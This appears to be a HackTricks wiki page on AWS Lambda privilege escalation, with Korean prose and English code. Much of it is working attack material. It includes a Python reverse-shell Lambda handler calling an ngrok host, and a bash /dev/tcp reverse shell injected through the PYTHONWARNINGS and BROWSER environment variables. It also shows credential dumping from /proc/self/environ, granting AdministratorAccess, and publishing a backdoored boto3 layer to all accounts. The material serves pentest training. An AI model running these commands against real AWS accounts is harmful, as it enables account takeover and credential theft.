# AWS - Lambda Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## lambda

lambdaì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, ë° `lambda:InvokeFunction`** ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ìëŠ” ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ë“¤ì€ **ìƒˆë¡œìš´ Lambda í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ê³  ê¸°ì¡´ IAM ì—­í• ì„ í• ë‹¹í•˜ì—¬**, í•´ë‹¹ ì—­í• ê³¼ ê´€ë ¨ëœ ê¶Œí•œì„ í•¨ìˆ˜ì— ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©ìëŠ” **ì´ Lambda í•¨ìˆ˜ì— ì½”ë“œë¥¼ ì‘ì„±í•˜ê³  ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: rev shell)**.\
í•¨ìˆ˜ê°€ ì„¤ì •ë˜ë©´ ì‚¬ìš©ìëŠ” **AWS APIë¥¼ í†µí•´ Lambda í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ ì ‘ê·¼ ë°©ì‹ì€ ì‚¬ìš©ìê°€ Lambda í•¨ìˆ˜ë¥¼ í†µí•´ ê°„ì ‘ì ìœ¼ë¡œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆê²Œ í•˜ë©°, í•´ë‹¹ í•¨ìˆ˜ì™€ ì—°ê²°ëœ IAM ì—­í• ì— ë¶€ì—¬ëœ ì ‘ê·¼ ìˆ˜ì¤€ìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤.\\

ê³µê²©ìëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ **rev shellì„ ì–»ê³  í† í°ì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
ë‹¹ì‹ ì€ ë˜í•œ **ëŒë‹¤ ì—­í•  ê¶Œí•œì„ ì•…ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ëŒë‹¤ ì—­í• ì— ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´, ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
ëŒë‹¤ì˜ ì—­í•  ìê²© ì¦ëª…ì„ ì™¸ë¶€ ì—°ê²° ì—†ì´ ìœ ì¶œí•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ëŠ” ë‚´ë¶€ ì‘ì—…ì— ì‚¬ìš©ë˜ëŠ” **ë„¤íŠ¸ì›Œí¬ ê²©ë¦¬ ëŒë‹¤**ì— ìœ ìš©í•  ê²ƒì…ë‹ˆë‹¤. ì—­ ì…¸ì„ í•„í„°ë§í•˜ëŠ” ì•Œ ìˆ˜ ì—†ëŠ” ë³´ì•ˆ ê·¸ë£¹ì´ ìˆëŠ” ê²½ìš°, ì´ ì½”ë“œëŠ” ëŒë‹¤ì˜ ì¶œë ¥ìœ¼ë¡œ ìê²© ì¦ëª…ì„ ì§ì ‘ ìœ ì¶œí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ ì„ì˜ì˜ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

{% hint style="danger" %}
í¥ë¯¸ë¡­ê²Œ ë³´ì¼ ìˆ˜ ìˆì§€ë§Œ **`lambda:InvokeAsync`**ëŠ” ë‹¨ë…ìœ¼ë¡œ **`aws lambda invoke-async`**ë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŒì„ ìœ ì˜í•˜ì„¸ìš”. `lambda:InvokeFunction`ë„ í•„ìš”í•©ë‹ˆë‹¤.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

ì´ì „ ì‹œë‚˜ë¦¬ì˜¤ì™€ ë§ˆì°¬ê°€ì§€ë¡œ, **`lambda:AddPermission`** ê¶Œí•œì´ ìˆë‹¤ë©´ **`lambda:InvokeFunction`** ê¶Œí•œì„ **ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ ì„ì˜ì˜ ëŒë‹¤ ì„œë¹„ìŠ¤ ì—­í• ë¡œ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, ë° `lambda:CreateEventSourceMapping`** ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ì(ê·¸ë¦¬ê³  ì ì¬ì ìœ¼ë¡œ `dynamodb:PutItem` ë° `dynamodb:CreateTable`)ëŠ” **`lambda:InvokeFunction`** ì—†ì´ë„ ê°„ì ‘ì ìœ¼ë¡œ **ê¶Œí•œì„ ìƒìŠ¹**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ë“¤ì€ **ì•…ì„± ì½”ë“œë¥¼ í¬í•¨í•œ Lambda í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ê³  ê¸°ì¡´ IAM ì—­í• ì„ í• ë‹¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì‚¬ìš©ìëŠ” Lambdaë¥¼ ì§ì ‘ í˜¸ì¶œí•˜ëŠ” ëŒ€ì‹ , ê¸°ì¡´ DynamoDB í…Œì´ë¸”ì„ ì„¤ì •í•˜ê±°ë‚˜ í™œìš©í•˜ì—¬ ì´ë²¤íŠ¸ ì†ŒìŠ¤ ë§¤í•‘ì„ í†µí•´ Lambdaì™€ ì—°ê²°í•©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ í…Œì´ë¸”ì— ìƒˆ í•­ëª©ì´ ì¶”ê°€ë  ë•Œ Lambda í•¨ìˆ˜ê°€ **ìë™ìœ¼ë¡œ íŠ¸ë¦¬ê±°**ë˜ë„ë¡ ë³´ì¥í•˜ë©°, ì´ëŠ” ì‚¬ìš©ìì˜ í–‰ë™ì´ë‚˜ ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ì— ì˜í•´ ì´ë£¨ì–´ì ¸ Lambda í•¨ìˆ˜ë¥¼ ê°„ì ‘ì ìœ¼ë¡œ í˜¸ì¶œí•˜ê³  ì „ë‹¬ëœ IAM ì—­í• ì˜ ê¶Œí•œìœ¼ë¡œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
ë§Œì•½ DynamoDBê°€ AWS í™˜ê²½ì—ì„œ ì´ë¯¸ í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´, ì‚¬ìš©ìëŠ” **Lambda í•¨ìˆ˜ì— ëŒ€í•œ ì´ë²¤íŠ¸ ì†ŒìŠ¤ ë§¤í•‘ì„ ì„¤ì •í•´ì•¼** í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ DynamoDBê°€ ì‚¬ìš©ë˜ì§€ ì•ŠëŠ” ê²½ìš°, ì‚¬ìš©ìëŠ” **ìŠ¤íŠ¸ë¦¬ë°ì´ í™œì„±í™”ëœ ìƒˆ í…Œì´ë¸”ì„ ìƒì„±í•´ì•¼** í•©ë‹ˆë‹¤:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
ì´ì œ **ì´ë²¤íŠ¸ ì†ŒìŠ¤ ë§¤í•‘ì„ ìƒì„±í•˜ì—¬ Lambda í•¨ìˆ˜ë¥¼ DynamoDB í…Œì´ë¸”ì— ì—°ê²°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
DynamoDB ìŠ¤íŠ¸ë¦¼ì— ì—°ê²°ëœ Lambda í•¨ìˆ˜ì™€ í•¨ê»˜ ê³µê²©ìëŠ” **DynamoDB ìŠ¤íŠ¸ë¦¼ì„ í™œì„±í™”í•˜ì—¬ Lambdaë¥¼ ê°„ì ‘ì ìœ¼ë¡œ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ëŠ” **DynamoDB í…Œì´ë¸”ì— í•­ëª©ì„ ì‚½ì…í•¨ìœ¼ë¡œì¨** ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**ì ì¬ì  ì˜í–¥:** ì§€ì •ëœ lambda ì„œë¹„ìŠ¤ ì—­í• ë¡œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `lambda:AddPermission`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ìì‹ (ë˜ëŠ” ë‹¤ë¥¸ ì‚¬ëŒ)ì—ê²Œ ëª¨ë“  ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì´ëŠ” ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ë¶€ì—¬í•˜ê¸° ìœ„í•´ ë¦¬ì†ŒìŠ¤ ê¸°ë°˜ ì •ì±…ì„ ìƒì„±í•©ë‹ˆë‹¤):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**ì ì¬ì  ì˜í–¥:** ì½”ë“œë¥¼ ìˆ˜ì •í•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ lambda ì„œë¹„ìŠ¤ ì—­í• ë¡œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `lambda:AddLayerVersionPermission`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ìì‹ (ë˜ëŠ” ë‹¤ë¥¸ ì‚¬ëŒ)ì—ê²Œ `lambda:GetLayerVersion` ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ê·¸ëŠ” ë ˆì´ì–´ì— ì ‘ê·¼í•˜ì—¬ ì·¨ì•½ì ì´ë‚˜ ë¯¼ê°í•œ ì •ë³´ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**ì ì¬ì  ì˜í–¥:** ë¯¼ê°í•œ ì •ë³´ì— ëŒ€í•œ ì ì¬ì  ì ‘ê·¼.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” **IAM ì—­í• ì— ì—°ê²°ëœ ê¸°ì¡´ Lambda í•¨ìˆ˜ì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì ì¬ë ¥ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.**\
ê³µê²©ìëŠ” **IAM ìê²© ì¦ëª…ì„ ìœ ì¶œí•˜ê¸° ìœ„í•´ lambdaì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

ê³µê²©ìê°€ í•¨ìˆ˜ë¥¼ ì§ì ‘ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì´ ì—†ë”ë¼ë„, Lambda í•¨ìˆ˜ê°€ ì´ë¯¸ ì¡´ì¬í•˜ê³  ì‘ë™ ì¤‘ì´ë¼ë©´, ê¸°ì¡´ ì›Œí¬í”Œë¡œìš°ë‚˜ ì´ë²¤íŠ¸ë¥¼ í†µí•´ íŠ¸ë¦¬ê±°ë  ê°€ëŠ¥ì„±ì´ ë†’ì•„ ìˆ˜ì •ëœ ì½”ë“œì˜ ì‹¤í–‰ì„ ê°„ì ‘ì ìœ¼ë¡œ ì´‰ì§„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**ì ì¬ì  ì˜í–¥:** ì‚¬ìš©ëœ lambda ì„œë¹„ìŠ¤ ì—­í• ì— ëŒ€í•œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `lambda:UpdateFunctionConfiguration`

#### env ë³€ìˆ˜ë¥¼ í†µí•œ RCE

ì´ ê¶Œí•œìœ¼ë¡œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì¶”ê°€í•˜ì—¬ Lambdaê°€ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, íŒŒì´ì¬ì—ì„œëŠ” í™˜ê²½ ë³€ìˆ˜ `PYTHONWARNING` ë° `BROWSER`ë¥¼ ì•…ìš©í•˜ì—¬ íŒŒì´ì¬ í”„ë¡œì„¸ìŠ¤ê°€ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

ë‹¤ë¥¸ ìŠ¤í¬ë¦½íŒ… ì–¸ì–´ì˜ ê²½ìš° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ í™˜ê²½ ë³€ìˆ˜ê°€ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ë‹¤ìŒì˜ ìŠ¤í¬ë¦½íŒ… ì–¸ì–´ í•˜ìœ„ ì„¹ì…˜ì„ í™•ì¸í•˜ì„¸ìš”:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### Lambda Layersë¥¼ í†µí•œ RCE

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)ëŠ” **ì½”ë“œ**ë¥¼ ëŒë‹¤ í•¨ìˆ˜ì— í¬í•¨í•  ìˆ˜ ìˆì§€ë§Œ **ë³„ë„ë¡œ ì €ì¥**í•  ìˆ˜ ìˆê²Œ í•´ì£¼ë¯€ë¡œ í•¨ìˆ˜ ì½”ë“œëŠ” ì‘ê²Œ ìœ ì§€í•  ìˆ˜ ìˆê³  **ì—¬ëŸ¬ í•¨ìˆ˜ê°€ ì½”ë“œë¥¼ ê³µìœ **í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ëŒë‹¤ ë‚´ë¶€ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì´ì¬ ì½”ë“œê°€ ë¡œë“œë˜ëŠ” ê²½ë¡œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
ì´ê³³ë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ì˜ˆë¥¼ ë“¤ì–´, ë¼ì´ë¸ŒëŸ¬ë¦¬ boto3ëŠ” `/var/runtime/boto3` (4ë²ˆì§¸ ìœ„ì¹˜)ì—ì„œ ë¡œë“œë©ë‹ˆë‹¤.

#### Exploitation

`lambda:UpdateFunctionConfiguration` ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ **ìƒˆ ë ˆì´ì–´ë¥¼ ì¶”ê°€**í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ë©´ ì´ ë ˆì´ì–´ì— **ëŒë‹¤ê°€ ê°€ì ¸ì˜¬ ë¼ì´ë¸ŒëŸ¬ë¦¬**ê°€ í¬í•¨ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ëŒë‹¤ì˜ ì½”ë“œë¥¼ ì½ì„ ìˆ˜ ìˆë‹¤ë©´ ì´ë¥¼ ì‰½ê²Œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ëŒë‹¤ê°€ **ì´ë¯¸ ë ˆì´ì–´ë¥¼ ì‚¬ìš©í•˜ê³  ìˆì„ ê°€ëŠ¥ì„±**ë„ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. ì´ ê²½ìš° ë ˆì´ì–´ë¥¼ **ë‹¤ìš´ë¡œë“œ**í•˜ê³  **ì½”ë“œë¥¼ ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ëŒë‹¤ê°€ ë¼ì´ë¸ŒëŸ¬ë¦¬ boto3ë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ê³  ê°€ì •í•´ ë³´ê² ìŠµë‹ˆë‹¤. ì´ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ìµœì‹  ë²„ì „ìœ¼ë¡œ ë¡œì»¬ ë ˆì´ì–´ë¥¼ ìƒì„±í•©ë‹ˆë‹¤:
```bash
pip3 install -t ./lambda_layer boto3
```
You can open `./lambda_layer/boto3/__init__.py` and **ì „ì—­ ì½”ë“œì— ë°±ë„ì–´ ì¶”ê°€** (ì˜ˆ: ìê²© ì¦ëª…ì„ ìœ ì¶œí•˜ê±°ë‚˜ ë¦¬ë²„ìŠ¤ ì…¸ì„ ì–»ëŠ” í•¨ìˆ˜).

ê·¸ëŸ° ë‹¤ìŒ, `./lambda_layer` ë””ë ‰í† ë¦¬ë¥¼ ì••ì¶•í•˜ê³  **ìƒˆ lambda ë ˆì´ì–´ë¥¼ ì—…ë¡œë“œ**í•©ë‹ˆë‹¤. (ìì‹ ì˜ ê³„ì •ì— ë˜ëŠ” í”¼í•´ìì˜ ê³„ì •ì—, í•˜ì§€ë§Œ ì´ ê²½ìš° ê¶Œí•œì´ ì—†ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤).\
python í´ë”ë¥¼ ìƒì„±í•˜ê³  ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê·¸ê³³ì— ë„£ì–´ /opt/python/boto3ë¥¼ ë®ì–´ì¨ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ, ë ˆì´ì–´ëŠ” lambdaì—ì„œ ì‚¬ìš©ë˜ëŠ” **íŒŒì´ì¬ ë²„ì „ê³¼ í˜¸í™˜ë˜ì–´ì•¼** í•˜ë©°, ê³„ì •ì— ì—…ë¡œë“œí•  ê²½ìš° **ê°™ì€ ì§€ì—­ì— ìˆì–´ì•¼** í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

ì´ì œ ì—…ë¡œë“œëœ ëŒë‹¤ ë ˆì´ì–´ë¥¼ **ëª¨ë“  ê³„ì •ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•˜ê²Œ** ë§Œë“œì„¸ìš”:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
ê·¸ë¦¬ê³  í”¼í•´ìì˜ ëŒë‹¤ í•¨ìˆ˜ì— ëŒë‹¤ ë ˆì´ì–´ë¥¼ ì—°ê²°í•©ë‹ˆë‹¤:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
ë‹¤ìŒ ë‹¨ê³„ëŠ” **í•¨ìˆ˜ë¥¼ ì§ì ‘ í˜¸ì¶œ**í•  ìˆ˜ ìˆê±°ë‚˜, ì¼ë°˜ì ì¸ ë°©ë²•ìœ¼ë¡œ **í˜¸ì¶œë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. í›„ìê°€ ë” ì•ˆì „í•œ ë°©ë²•ì…ë‹ˆë‹¤.

**ì´ ì·¨ì•½ì ì„ í™œìš©í•˜ëŠ” ë” ì€ë°€í•œ ë°©ë²•**ì€ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**ì ì¬ì  ì˜í–¥:** ì‚¬ìš©ëœ lambda ì„œë¹„ìŠ¤ ì—­í• ë¡œì˜ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ì´ ê¶Œí•œìœ¼ë¡œ í•¨ìˆ˜ë¥¼ ìƒì„±í•˜ê³  URLì„ í˜¸ì¶œí•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤... í•˜ì§€ë§Œ ì´ë¥¼ í…ŒìŠ¤íŠ¸í•  ë°©ë²•ì„ ì°¾ì§€ ëª»í–ˆìœ¼ë‹ˆ, ì°¾ìœ¼ë©´ ì•Œë ¤ì£¼ì„¸ìš”!

### Lambda MitM

ì¼ë¶€ lambdaëŠ” **ì‚¬ìš©ìë¡œë¶€í„° ë§¤ê°œë³€ìˆ˜ë¡œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ë°›ì„ ê²ƒì…ë‹ˆë‹¤.** ê·¸ ì¤‘ í•˜ë‚˜ì—ì„œ RCEë¥¼ ì–»ìœ¼ë©´, ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ë³´ë‚´ëŠ” ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í™•ì¸í•´ ë³´ì„¸ìš”:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## References

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜, **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš”** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
